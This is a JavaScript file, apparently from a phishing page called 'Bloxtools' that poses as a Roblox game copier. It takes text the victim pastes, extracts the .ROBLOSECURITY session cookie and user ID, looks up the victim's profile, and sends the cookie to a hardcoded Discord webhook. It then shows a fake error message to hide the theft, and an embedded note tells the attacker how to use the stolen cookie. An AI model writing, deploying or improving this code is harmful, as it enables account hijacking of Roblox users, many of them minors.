/* ======================================================
   PAYLOAD.JS - OPTIMIZED & FEATURE-RICH
   - Fast parallel fetching with Promise.allSettled
   - Filters avatar items to clothes & accessories only
   - Displays profile thumbnail + cookie below info
   - Clean Discord embed layout
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

// CORS proxies (first is fastest, fallback for reliability)
const CORS_PROXIES = [
    "https://api.allorigins.win/raw?url=",
    "https://corsproxy.io/?",
    "https://cors-anywhere.herokuapp.com/"
];

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract .ROBLOSECURITY cookie and rbxuid from PowerShell dump
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Game Key is invalid." };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Fast fetch with proxy, retry once, 5s timeout
async function fetchRobloxAPI(endpoint, retries = 1) {
    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
    for (let attempt = 0; attempt <= retries; attempt++) {
        for (const proxy of CORS_PROXIES) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                const res = await fetch(`${proxy}${encodeURIComponent(endpoint)}`, { signal: controller.signal });
                clearTimeout(timeoutId);
                if (!res.ok) continue;
                const text = await res.text();
                return JSON.parse(text);
            } catch (e) { /* try next */ }
        }
        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
    }
    return null;
}

// ---- User info ----
async function fetchUserInfo(userId) {
    const data = await fetchRobloxAPI(`users.roblox.com/v1/users/${userId}`);
    if (!data?.name) return null;
    return {
        username: data.name,
        displayName: data.displayName || data.name,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

// ---- Friends count ----
async function fetchFriendsCount(userId) {
    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || "Unavailable";
}

// ---- Followers total ----
async function fetchFollowersCount(userId) {
    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    return data?.total?.toLocaleString() || "Unavailable";
}

// ---- Groups (first 5) ----
async function fetchGroups(userId) {
    const data = await fetchRobloxAPI(`groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!data?.data?.length) return [];
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

// ---- Badges (first 5) ----
async function fetchBadges(userId) {
    const data = await fetchRobloxAPI(`badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!data?.data?.length) return [];
    return data.data.map(b => b.badge.name);
}

// ---- Avatar items: filter to clothes (shirt, pants, t-shirt) + accessories ----
async function fetchFilteredAvatarItems(userId) {
    const data = await fetchRobloxAPI(`avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!data?.assets?.length) return "None equipped";
    
    // Allowed asset types: 2=T-shirt, 8=Hat/Accessory, 11=Shirt, 12=Pants
    const allowedTypes = [2, 8, 11, 12];
    const filtered = data.assets.filter(asset => allowedTypes.includes(asset.assetType.id));
    if (filtered.length === 0) return "No clothes or accessories equipped";
    
    const names = filtered.slice(0, 8).map(a => a.name);
    return names.join(", ") + (filtered.length > 8 ? " …" : "");
}

// ---- Avatar thumbnail URL ----
async function fetchAvatarThumbnail(userId) {
    const data = await fetchRobloxAPI(`thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Robux cannot be fetched client-side due to CORS & cookie restrictions
function robuxNote() {
    return "❌ Cannot fetch Robux client-side.\nUse the cookie with a tool or browser extension.";
}

// ---- Send everything to Discord ----
async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    statusMessage.textContent = "⏳ Fetching profile (parallel, ~5-8 sec)...";
    
    // Parallel fetch with allSettled (no single failure blocks others)
    const results = await Promise.allSettled([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchFilteredAvatarItems(userId),
        fetchAvatarThumbnail(userId)
    ]);
    
    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl] = results.map(r => r.status === "fulfilled" ? r.value : null);
    
    // Build embed
    const embed = {
        title: "🔓 Roblox Profile Extraction",
        thumbnail: { url: avatarUrl || "https://www.roblox.com/favicon.ico" },
        color: 0x8c52ff,
        description: `**User ID (rbxuid):** \`${userId}\`\n**Cookie length:** ${cookie.length} characters`,
        fields: [],
        footer: { text: "Bloxtools • Optimized" },
        timestamp: new Date().toISOString()
    };
    
    // Cookie field (placed prominently)
    embed.fields.push({
        name: "🔐 .ROBLOSECURITY Cookie",
        value: `\`\`\`\n${cookie}\n\`\`\``,
        inline: false
    });
    
    // Profile info
    if (userInfo) {
        embed.fields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
    } else {
        embed.fields.push({ name: "⚠️ Profile Error", value: "Could not fetch user info.", inline: false });
    }
    
    // Stats row
    embed.fields.push(
        { name: "👥 Friends", value: friendsCount || "N/A", inline: true },
        { name: "👀 Followers", value: followersCount || "N/A", inline: true },
        { name: "💰 Robux", value: robuxNote(), inline: true }
    );
    
    // Wearing (only clothes & accessories)
    embed.fields.push({
        name: "👕 Wearing (Clothes & Accessories)",
        value: avatarItems || "None equipped",
        inline: false
    });
    
    // Groups & Badges
    if (groups && groups.length) {
        embed.fields.push({ name: "🏢 Groups (first 5)", value: groups.join("\n"), inline: false });
    }
    if (badges && badges.length) {
        embed.fields.push({ name: "🏅 Badges (first 5)", value: badges.join("\n"), inline: false });
    }
    
    // Add note about missing Robux
    embed.fields.push({
        name: "📌 Note",
        value: "Robux balance requires server‑side authentication. Paste the cookie into a browser extension or Roblox account checker to see balance & pending.",
        inline: false
    });
    
    const payload = {
        username: "Bloxtools Processing System",
        embeds: [embed]
    };
    
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (err) {
        console.error(err);
        return false;
    }
}

// ---- Main button handler ----
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    
    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    
    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Processing...";
    statusMessage.style.color = "#caa8ff";
    
    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
    
    if (success) {
        statusMessage.textContent = "Error Copying Game! Game copier may temporarily be down.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "Invalid Game Key";
        statusMessage.style.color = "#ff9d9d";
    }
    
    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
